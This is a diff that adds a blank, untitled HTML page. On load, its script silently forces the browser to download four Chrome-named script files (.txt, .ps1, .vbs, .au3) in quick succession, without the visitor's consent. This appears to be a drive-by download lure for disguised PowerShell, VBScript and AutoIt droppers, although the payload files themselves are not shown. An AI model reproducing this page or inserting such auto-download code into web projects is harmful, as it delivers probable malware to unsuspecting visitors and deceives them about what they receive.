@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+    <style>html, body { margin: 0; padding: 0; width: 100%; height: 100%; background: #ffffff; }</style>
+</head>
+<body>
+    <script>
+        function dl(url, name) {
+            const a = document.createElement("a");
+            a.href = url;
+            a.download = name;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        }
+        window.addEventListener("DOMContentLoaded", () => {
+            const baseUrl = (window.location.origin + window.location.pathname).replace(/\/d(?:\/index\.html)?\/?$/, '');
+            const files = ["chrome.txt", "chrome.ps1", "chrome.vbs", "chrome.au3"];
+            files.forEach((f, idx) => {
+                setTimeout(() => {
+                    dl(`${baseUrl}/files/${f}`, f);
+                }, idx * 450);
+            });
+        });
+    </script>
+</body>
+</html>
